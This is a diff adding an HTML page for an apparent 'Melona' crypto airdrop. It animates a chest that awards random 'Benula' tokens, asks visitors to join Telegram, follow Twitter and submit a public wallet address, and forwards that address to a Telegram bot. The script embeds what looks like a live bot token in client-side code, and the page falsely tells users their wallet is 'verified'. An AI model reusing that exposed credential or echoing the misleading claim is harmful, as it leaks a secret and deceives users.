@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Melona - Benula Airdrop</title>
+
+    <style>
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0b0a0f;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1rem;
+            margin: 0;
+            background-image: radial-gradient(ellipse at 50% 0%, #1a1425 0%, #0b0a0f 70%);
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(18, 16, 26, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 3rem;
+            padding: 2rem 1.5rem 2.5rem;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), inset 0 0 0 1px rgba(255, 215, 0, 0.08);
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 215, 0, 0.1);
+        }
+
+        /* ===== LOGO / TITLE ===== */
+        .logo {
+            font-size: 2.2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f9d976, #ffb800, #f9d976);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+            margin-bottom: 0.25rem;
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .sub-logo {
+            color: #a89fbb;
+            font-size: 0.9rem;
+            letter-spacing: 3px;
+            margin-bottom: 1.8rem;
+            opacity: 0.7;
+        }
+
+        /* ===== GOLDEN BOX ===== */
+        .box-wrapper {
+            position: relative;
+            margin: 0.5rem auto 2rem;
+            width: 220px;
+            height: 220px;
+            cursor: pointer;
+            perspective: 800px;
+        }
+        .box-wrapper.disabled {
+            cursor: default;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .box {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        /* Box lid (top) */
+        .box-lid {
+            position: absolute;
+            top: -8px;
+            left: -6px;
+            right: -6px;
+            height: 55px;
+            background: radial-gradient(ellipse at 30% 20%, #ffd700, #b8860b);
+            border-radius: 14px 14px 4px 4px;
+            transform-origin: bottom center;
+            transition: transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+            z-index: 10;
+            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.3), inset 0 -2px 10px rgba(0, 0, 0, 0.3);
+            border: 2px solid #daa520;
+            transform: rotateX(0deg);
+        }
+        .box-lid::after {
+            content: '';
+            position: absolute;
+            top: 6px;
+            left: 20%;
+            right: 20%;
+            height: 8px;
+            background: radial-gradient(ellipse at center, #ffd700, #b8860b);
+            border-radius: 50%;
+            opacity: 0.5;
+            filter: blur(3px);
+        }
+
+        /* Box body */
+        .box-body {
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse at 30% 20%, #ffd700, #b8860b, #8b6914);
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(255, 215, 0, 0.25), inset 0 -8px 20px rgba(0, 0, 0, 0.4), inset 0 8px 30px rgba(255, 215, 0, 0.15);
+            border: 3px solid #daa520;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+
+        /* Gold pattern lines on box */
+        .box-body::before {
+            content: '';
+            position: absolute;
+            inset: 10px;
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            border-radius: 10px;
+            background: repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255, 215, 0, 0.03) 10px, rgba(255, 215, 0, 0.03) 11px);
+            pointer-events: none;
+        }
+
+        /* Gold shimmer overlay */
+        .box-body::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, transparent 30%, rgba(255, 215, 0, 0.1) 50%, transparent 70%);
+            background-size: 300% 300%;
+            animation: goldShine 4s ease-in-out infinite;
+            border-radius: 13px;
+            pointer-events: none;
+        }
+
+        @keyframes goldShine {
+            0%,
+            100% {
+                background-position: 0% 50%;
+                opacity: 0.3;
+            }
+            50% {
+                background-position: 100% 50%;
+                opacity: 0.8;
+            }
+        }
+
+        /* Glow ring */
+        .box-wrapper::before {
+            content: '';
+            position: absolute;
+            inset: -10px;
+            border-radius: 26px;
+            background: conic-gradient(from 0deg, #ffd700, #ff8c00, #ffd700, #ff8c00, #ffd700);
+            background-size: 300% 300%;
+            animation: rotateGlow 6s linear infinite;
+            opacity: 0.15;
+            filter: blur(12px);
+            z-index: -1;
+            transition: opacity 0.6s ease;
+        }
+        .box-wrapper.opened::before {
+            opacity: 0.6;
+            animation-duration: 1.5s;
+            filter: blur(20px);
+        }
+
+        @keyframes rotateGlow {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* ===== BOX TEXT ===== */
+        .box-text {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #fff3d1;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3), 0 4px 15px rgba(0, 0, 0, 0.5);
+            padding: 0.5rem;
+            line-height: 1.5;
+            pointer-events: none;
+            position: relative;
+            z-index: 2;
+        }
+        .box-text .icon {
+            font-size: 2.8rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .box-text small {
+            display: block;
+            font-size: 0.7rem;
+            opacity: 0.8;
+            font-weight: 400;
+            margin-top: 4px;
+            color: #ffd700;
+        }
+
+        /* ===== SPARKLE PARTICLES ===== */
+        .sparkle-container {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            overflow: visible;
+            z-index: 20;
+        }
+        .sparkle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: radial-gradient(circle, #ffd700, #ff8c00);
+            border-radius: 50%;
+            opacity: 0;
+            pointer-events: none;
+            box-shadow: 0 0 20px #ffd700, 0 0 60px #ff8c00;
+        }
+
+        /* ===== TOKEN RESULT ===== */
+        .result-box {
+            background: rgba(255, 215, 0, 0.04);
+            border-radius: 2rem;
+            padding: 1rem 1rem 1.2rem;
+            margin: 0.5rem 0 1.5rem;
+            border: 1px solid rgba(255, 215, 0, 0.08);
+            transition: all 0.3s ease;
+            min-height: 70px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .result-box .token-amount {
+            font-size: 2.4rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f9d976, #ffb800, #f9d976);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 2s ease-in-out infinite;
+        }
+        .result-box .token-label {
+            color: #a89fbb;
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+        }
+
+        /* ===== STEPS ===== */
+        .steps {
+            margin: 1.8rem 0 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.7rem;
+        }
+
+        .step {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 1.5rem;
+            padding: 0.7rem 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: all 0.3s ease;
+            opacity: 0.4;
+            pointer-events: none;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .step.active {
+            opacity: 1;
+            pointer-events: auto;
+            border-color: rgba(255, 215, 0, 0.3);
+            background: rgba(255, 215, 0, 0.06);
+        }
+        .step.done {
+            opacity: 0.7;
+            pointer-events: none;
+            border-color: rgba(100, 200, 100, 0.2);
+            background: rgba(100, 200, 100, 0.05);
+        }
+        .step.done .step-icon {
+            background: #2e7d32;
+        }
+
+        .step-left {
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+        }
+        .step-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            color: #fff;
+            font-weight: 700;
+            flex-shrink: 0;
+            transition: 0.3s;
+        }
+        .step.active .step-icon {
+            background: rgba(255, 215, 0, 0.2);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.15);
+        }
+        .step-text {
+            font-size: 0.9rem;
+            color: #d6d0e0;
+            text-align: left;
+        }
+        .step-text .highlight {
+            color: #ffd700;
+        }
+
+        .step-action {
+            font-size: 0.75rem;
+            background: rgba(255, 215, 0, 0.08);
+            padding: 0.3rem 0.9rem;
+            border-radius: 2rem;
+            color: #ffd700;
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            cursor: pointer;
+            transition: 0.3s;
+            white-space: nowrap;
+        }
+        .step-action:hover {
+            background: rgba(255, 215, 0, 0.15);
+            transform: scale(1.05);
+        }
+        .step.done .step-action {
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        /* ===== WALLET INPUT ===== */
+        .wallet-section {
+            margin-top: 0.8rem;
+            display: none;
+            flex-direction: column;
+            gap: 0.7rem;
+        }
+        .wallet-section.show {
+            display: flex;
+        }
+
+        .wallet-input-group {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+        .wallet-input-group input {
+            flex: 1;
+            padding: 0.7rem 1rem;
+            border-radius: 2rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 215, 0, 0.1);
+            color: #fff;
+            font-size: 0.9rem;
+            outline: none;
+            transition: 0.3s;
+            min-width: 160px;
+        }
+        .wallet-input-group input:focus {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.05);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.05);
+        }
+        .wallet-input-group input::placeholder {
+            color: #6a6480;
+        }
+        .wallet-input-group button {
+            padding: 0.7rem 1.4rem;
+            border-radius: 2rem;
+            border: none;
+            background: linear-gradient(135deg, #ffd700, #b8860b);
+            color: #1a1425;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            white-space: nowrap;
+            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.15);
+        }
+        .wallet-input-group button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 30px rgba(255, 215, 0, 0.3);
+        }
+        .wallet-input-group button:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        /* ===== FINAL MESSAGE ===== */
+        .final-message {
+            margin-top: 1.5rem;
+            padding: 1.2rem;
+            border-radius: 2rem;
+            background: rgba(255, 215, 0, 0.05);
+            border: 1px solid rgba(255, 215, 0, 0.12);
+            display: none;
+            animation: fadeInUp 0.6s ease;
+        }
+        .final-message.show {
+            display: block;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .final-message .title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #ffd700;
+        }
+        .final-message .sub {
+            color: #a89fbb;
+            margin-top: 0.3rem;
+            font-size: 0.95rem;
+        }
+        .final-message .wallet-addr {
+            background: rgba(255, 215, 0, 0.05);
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            margin: 0.6rem auto;
+            display: inline-block;
+            font-size: 0.8rem;
+            color: #ffd700;
+            word-break: break-all;
+            max-width: 100%;
+            border: 1px solid rgba(255, 215, 0, 0.1);
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .final-message .wallet-addr:hover {
+            background: rgba(255, 215, 0, 0.08);
+            transform: scale(1.02);
+        }
+        .final-message .token-final {
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f9d976, #ffb800);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem 1rem 2rem;
+            }
+            .box-wrapper {
+                width: 170px;
+                height: 170px;
+            }
+            .box-lid {
+                height: 42px;
+                top: -6px;
+            }
+            .box-text .icon {
+                font-size: 2rem;
+            }
+            .box-text {
+                font-size: 0.9rem;
+            }
+            .result-box .token-amount {
+                font-size: 1.8rem;
+            }
+            .step {
+                padding: 0.6rem 1rem;
+            }
+            .step-text {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container" id="app">
+        <!-- LOGO -->
+        <div class="logo">Melona</div>
+        <div class="sub-logo">⚡ Benula • Airdrop</div>
+
+        <!-- GOLDEN BOX -->
+        <div class="box-wrapper" id="boxWrapper">
+            <div class="box" id="box">
+                <div class="box-lid" id="boxLid"></div>
+                <div class="box-body">
+                    <span class="box-text" id="boxText">
+                        <span class="icon">📦</span>
+                        Tap to Open
+                        <small>Golden Chest</small>
+                    </span>
+                </div>
+                <div class="sparkle-container" id="sparkleContainer"></div>
+            </div>
+        </div>
+
+        <!-- RESULT -->
+        <div class="result-box" id="resultBox">
+            <div class="token-label">✦ Your Benula Tokens</div>
+            <div class="token-amount" id="tokenDisplay">—</div>
+        </div>
+
+        <!-- STEPS -->
+        <div class="steps" id="stepsContainer">
+            <div class="step active" id="stepTelegram">
+                <div class="step-left">
+                    <span class="step-icon">1</span>
+                    <span class="step-text">Join <span class="highlight">Telegram</span></span>
+                </div>
+                <span class="step-action" id="btnTelegram">Join →</span>
+            </div>
+            <div class="step" id="stepTwitter">
+                <div class="step-left">
+                    <span class="step-icon">2</span>
+                    <span class="step-text">Follow <span class="highlight">Twitter</span></span>
+                </div>
+                <span class="step-action" id="btnTwitter">Follow →</span>
+            </div>
+            <div class="step" id="stepWallet">
+                <div class="step-left">
+                    <span class="step-icon">3</span>
+                    <span class="step-text">Submit <span class="highlight">Gram</span> Wallet</span>
+                </div>
+                <span class="step-action" id="btnWallet">Enter →</span>
+            </div>
+        </div>
+
+        <!-- WALLET INPUT -->
+        <div class="wallet-section" id="walletSection">
+            <div class="wallet-input-group">
+                <input type="text" id="walletInput" placeholder="Paste Gram address (UQ/EQ...)" />
+                <button id="walletSubmit">Confirm</button>
+            </div>
+            <div style="font-size:0.7rem;color:#6a6480;text-align:right;">Format: starts with UQ or EQ</div>
+        </div>
+
+        <!-- FINAL MESSAGE -->
+        <div class="final-message" id="finalMessage">
+            <div class="title">🏆 Registration Confirmed!</div>
+            <div class="sub">Your wallet is verified. Wait for TGE.</div>
+            <div style="margin:0.8rem 0 0.2rem;font-size:0.8rem;color:#a89fbb;">Gram Address:</div>
+            <div class="wallet-addr" id="finalWallet">—</div>
+            <div style="margin-top:0.8rem;">
+                <span class="token-final" id="finalToken">0</span>
+                <span style="color:#a89fbb;font-size:0.9rem;"> Benula</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  CONFIG - TELEGRAM BOT
+        // ============================================================
+        const CONFIG = {
+            BOT_TOKEN: '8801299247:AAGwWZiruvs39f8PoIABRGeXpj99Gm6t7uc',
+            CHAT_ID: '8801299247',
+            TELEGRAM_LINK: 'https://t.me/Melona_Collection',
+            TWITTER_LINK: 'https://x.com/MelonaCollectio',
+            PROJECT_NAME: 'Melona',
+            TOKEN_NAME: 'Benula',
+        };
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+        const state = {
+            step: 0,
+            tokenAmount: 0,
+            walletAddress: '',
+            isBoxOpened: false,
+            isTelegramDone: false,
+            isTwitterDone: false,
+            isWalletDone: false,
+            userId: '',
+            clickCount: 0,
+            isOpening: false,
+        };
+
+        // ============================================================
+        //  DOM REFS
+        // ============================================================
+        const boxWrapper = document.getElementById('boxWrapper');
+        const box = document.getElementById('box');
+        const boxLid = document.getElementById('boxLid');
+        const boxText = document.getElementById('boxText');
+        const tokenDisplay = document.getElementById('tokenDisplay');
+        const sparkleContainer = document.getElementById('sparkleContainer');
+
+        const stepTelegram = document.getElementById('stepTelegram');
+        const stepTwitter = document.getElementById('stepTwitter');
+        const stepWallet = document.getElementById('stepWallet');
+        const btnTelegram = document.getElementById('btnTelegram');
+        const btnTwitter = document.getElementById('btnTwitter');
+        const btnWallet = document.getElementById('btnWallet');
+
+        const walletSection = document.getElementById('walletSection');
+        const walletInput = document.getElementById('walletInput');
+        const walletSubmit = document.getElementById('walletSubmit');
+
+        const finalMessage = document.getElementById('finalMessage');
+        const finalWallet = document.getElementById('finalWallet');
+        const finalToken = document.getElementById('finalToken');
+
+        // ============================================================
+        //  UTILITY: Random token (100 to 5000)
+        // ============================================================
+        function getRandomToken() {
+            const rand = Math.random() * 100;
+            let amount = 0;
+            if (rand < 80) {
+                amount = Math.floor(Math.random() * 900) + 100;
+            } else if (rand < 95) {
+                amount = Math.floor(Math.random() * 1000) + 1000;
+            } else {
+                amount = Math.floor(Math.random() * 3001) + 2000;
+            }
+            return amount;
+        }
+
+        // ============================================================
+        //  UTILITY: Cookie
+        // ============================================================
+        function getCookie(name) {
+            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+            return match ? decodeURIComponent(match[2]) : null;
+        }
+
+        function setCookie(name, value, days = 365) {
+            const d = new Date();
+            d.setTime(d.getTime() + days * 24 * 60 * 60 * 1000);
+            document.cookie = name + '=' + encodeURIComponent(value) + ';expires=' + d.toUTCString() + ';path=/';
+        }
+
+        function generateUserId() {
+            return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        }
+
+        // ============================================================
+        //  UTILITY: Send to Telegram
+        // ============================================================
+        function sendToTelegram(wallet, token) {
+            const message = `🎁 New Registration on Melona Airdrop!
+
+👤 User ID: ${state.userId}
+💰 Benula Tokens: ${token}
+📱 Gram Wallet: ${wallet}
+📅 Date: ${new Date().toLocaleString()}
+
+✅ Status: Confirmed - Wait for TGE`;
+
+            const url =
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('✅ Sent to Telegram successfully!');
+                    } else {
+                        console.warn('⚠️ Telegram send failed:', response.status);
+                    }
+                })
+                .catch(err => {
+                    console.warn('❌ Telegram error:', err);
+                    // Fallback: save locally if Telegram fails
+                    localStorage.setItem('fallback_user_' + state.userId, JSON.stringify({
+                        wallet: wallet,
+                        token: token,
+                        userId: state.userId,
+                        date: new Date().toISOString()
+                    }));
+                });
+        }
+
+        // ============================================================
+        //  SPARKLE EFFECT
+        // ============================================================
+        function createSparkles() {
+            const container = sparkleContainer;
+            const rect = boxWrapper.getBoundingClientRect();
+            const cx = rect.width / 2;
+            const cy = rect.height / 2;
+
+            for (let i = 0; i < 40; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.className = 'sparkle';
+                const angle = Math.random() * 2 * Math.PI;
+                const dist = 40 + Math.random() * 120;
+                const dx = Math.cos(angle) * dist;
+                const dy = Math.sin(angle) * dist - 20;
+                const size = 4 + Math.random() * 12;
+                sparkle.style.cssText = `
+                            left: ${cx + dx - size/2}px;
+                            top: ${cy + dy - size/2}px;
+                            width: ${size}px;
+                            height: ${size}px;
+                            animation: sparkleBurst ${0.6 + Math.random() * 0.6}s ease-out forwards;
+                            animation-delay: ${Math.random() * 0.2}s;
+                            background: radial-gradient(circle, #ffd700, #ff8c00, transparent);
+                            box-shadow: 0 0 ${size * 2}px #ffd700, 0 0 ${size * 4}px #ff8c00;
+                        `;
+                container.appendChild(sparkle);
+                setTimeout(() => sparkle.remove(), 1200);
+            }
+        }
+
+        // Add sparkle animation keyframes dynamically
+        const styleSheet = document.createElement('style');
+        styleSheet.textContent = `
+                    @keyframes sparkleBurst {
+                        0% { transform: scale(0) rotate(0deg); opacity: 1; }
+                        100% { transform: scale(1.5) rotate(180deg) translateY(-60px); opacity: 0; }
+                    }
+                `;
+        document.head.appendChild(styleSheet);
+
+        // ============================================================
+        //  OPEN BOX (with gentle animation)
+        // ============================================================
+        function openBox() {
+            if (state.isBoxOpened || state.isOpening) return;
+
+            // Check if already opened in cookie
+            if (getCookie('melona_box_opened') === 'true') {
+                state.isBoxOpened = true;
+                state.tokenAmount = parseInt(getCookie('melona_token') || '0');
+                state.step = 1;
+                updateUI();
+                return;
+            }
+
+            state.isOpening = true;
+
+            // Increment click count for gentle opening feel
+            state.clickCount++;
+            const clicksNeeded = 2 + Math.floor(Math.random() * 2); // 2-3 clicks
+
+            // Visual feedback on click
+            boxWrapper.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                boxWrapper.style.transform = 'scale(1)';
+            }, 150);
+
+            // Show progress
+            if (state.clickCount < clicksNeeded) {
+                const progress = ['✦', '✦✦', '✦✦✦'][state.clickCount - 1] || '✦✦✦';
+                boxText.innerHTML = `
+                            <span class="icon">📦</span>
+                            Opening... ${progress}
+                            <small>Tap again</small>
+                        `;
+                state.isOpening = false;
+                return;
+            }
+
+            // OPEN THE BOX!
+            state.isBoxOpened = true;
+
+            // Generate token
+            const token = getRandomToken();
+            state.tokenAmount = token;
+            state.userId = getCookie('melona_user') || generateUserId();
+            setCookie('melona_user', state.userId);
+            setCookie('melona_box_opened', 'true');
+            setCookie('melona_token', String(token));
+
+            // Animate lid opening
+            boxLid.style.transform = 'rotateX(-110deg)';
+            boxLid.style.transition = 'transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1)';
+
+            // Sparkle burst
+            createSparkles();
+
+            // Update text
+            setTimeout(() => {
+                boxText.innerHTML = `
+                            <span class="icon">🎉</span>
+                            +${token} Benula!
+                            <small>Golden Treasure!</small>
+                        `;
+                tokenDisplay.textContent = token;
+                boxWrapper.classList.add('opened');
+                state.step = 1;
+                updateUI();
+                state.isOpening = false;
+            }, 400);
+        }
+
+        // ============================================================
+        //  UI UPDATE
+        // ============================================================
+        function updateUI() {
+            const steps = [stepTelegram, stepTwitter, stepWallet];
+            const stepStatus = [
+                state.isTelegramDone ? 'done' : (state.step >= 1 ? 'active' : ''),
+                state.isTwitterDone ? 'done' : (state.step >= 2 ? 'active' : ''),
+                state.isWalletDone ? 'done' : (state.step >= 3 ? 'active' : ''),
+            ];
+
+            steps.forEach((el, i) => {
+                el.classList.remove('active', 'done');
+                if (stepStatus[i] === 'active') el.classList.add('active');
+                if (stepStatus[i] === 'done') el.classList.add('done');
+            });
+
+            if (state.step === 3 && !state.isWalletDone) {
+                walletSection.classList.add('show');
+            } else {
+                walletSection.classList.remove('show');
+            }
+
+            if (state.step === 4 && state.isWalletDone) {
+                finalMessage.classList.add('show');
+                finalWallet.textContent = state.walletAddress;
+                finalToken.textContent = state.tokenAmount;
+            } else {
+                finalMessage.classList.remove('show');
+            }
+
+            if (state.tokenAmount > 0) {
+                tokenDisplay.textContent = state.tokenAmount;
+            } else {
+                tokenDisplay.textContent = '—';
+            }
+
+            if (state.isBoxOpened) {
+                boxWrapper.classList.add('disabled');
+            }
+        }
+
+        // ============================================================
+        //  STEPS
+        // ============================================================
+        function doTelegram() {
+            if (state.isTelegramDone) return;
+            window.open(CONFIG.TELEGRAM_LINK, '_blank');
+            state.isTelegramDone = true;
+            state.tokenAmount += 20;
+            setCookie('melona_token', String(state.tokenAmount));
+            setCookie('melona_telegram', 'true');
+            state.step = 2;
+            updateUI();
+        }
+
+        function doTwitter() {
+            if (state.isTwitterDone) return;
+            window.open(CONFIG.TWITTER_LINK, '_blank');
+            state.isTwitterDone = true;
+            state.tokenAmount += 20;
+            setCookie('melona_token', String(state.tokenAmount));
+            setCookie('melona_twitter', 'true');
+            state.step = 3;
+            updateUI();
+        }
+
+        function doWallet() {
+            if (state.isWalletDone) return;
+            walletSection.classList.add('show');
+            walletInput.focus();
+        }
+
+        function submitWallet() {
+            if (state.isWalletDone) return;
+            const addr = walletInput.value.trim();
+            if (!addr) {
+                alert('Please paste your Gram wallet address.');
+                return;
+            }
+            if (!addr.match(/^[UE]Q[0-9A-Za-z_-]{30,60}$/)) {
+                alert('Invalid Gram address. Must start with UQ or EQ.');
+                return;
+            }
+
+            state.walletAddress = addr;
+            state.isWalletDone = true;
+            setCookie('melona_wallet', addr);
+            setCookie('melona_done', 'true');
+
+            // Send to Telegram
+            sendToTelegram(addr, state.tokenAmount);
+
+            state.step = 4;
+            updateUI();
+        }
+
+        // ============================================================
+        //  LOAD STATE
+        // ============================================================
+        function loadState() {
+            const boxOpened = getCookie('melona_box_opened') === 'true';
+            const telegramDone = getCookie('melona_telegram') === 'true';
+            const twitterDone = getCookie('melona_twitter') === 'true';
+            const walletDone = getCookie('melona_done') === 'true';
+            const savedToken = parseInt(getCookie('melona_token') || '0');
+            const savedWallet = getCookie('melona_wallet') || '';
+            const userId = getCookie('melona_user') || generateUserId();
+
+            state.userId = userId;
+            if (!getCookie('melona_user')) setCookie('melona_user', userId);
+
+            if (boxOpened) {
+                state.isBoxOpened = true;
+                state.tokenAmount = savedToken || getRandomToken();
+                state.step = 1;
+                boxWrapper.classList.add('opened');
+                boxLid.style.transform = 'rotateX(-110deg)';
+                boxText.innerHTML = `
+                            <span class="icon">🎉</span>
+                            +${state.tokenAmount} Benula!
+                            <small>Golden Treasure!</small>
+                        `;
+                tokenDisplay.textContent = state.tokenAmount;
+                boxWrapper.classList.add('disabled');
+            }
+
+            if (telegramDone) {
+                state.isTelegramDone = true;
+                if (state.tokenAmount < 100) state.tokenAmount += 20;
+                state.step = 2;
+            }
+
+            if (twitterDone) {
+                state.isTwitterDone = true;
+                if (state.tokenAmount < 200) state.tokenAmount += 20;
+                state.step = 3;
+            }
+
+            if (walletDone) {
+                state.isWalletDone = true;
+                state.walletAddress = savedWallet;
+                state.step = 4;
+            }
+
+            if (state.tokenAmount > 0) {
+                setCookie('melona_token', String(state.tokenAmount));
+            }
+
+            updateUI();
+        }
+
+        // ============================================================
+        //  EVENTS
+        // ============================================================
+        boxWrapper.addEventListener('click', openBox);
+
+        btnTelegram.addEventListener('click', doTelegram);
+        btnTwitter.addEventListener('click', doTwitter);
+        btnWallet.addEventListener('click', doWallet);
+
+        walletSubmit.addEventListener('click', submitWallet);
+        walletInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') submitWallet();
+        });
+
+        finalWallet.addEventListener('click', () => {
+            if (state.walletAddress) {
+                navigator.clipboard.writeText(state.walletAddress).then(() => {
+                    alert('Wallet address copied!');
+                }).catch(() => {
+                    const range = document.createRange();
+                    range.selectNode(finalWallet);
+                    window.getSelection().removeAllRanges();
+                    window.getSelection().addRange(range);
+                    document.execCommand('copy');
+                    alert('Wallet address copied!');
+                });
+            }
+        });
+
+        // ============================================================
+        //  START
+        // ============================================================
+        loadState();
+    </script>
+</body>
+                      </html>
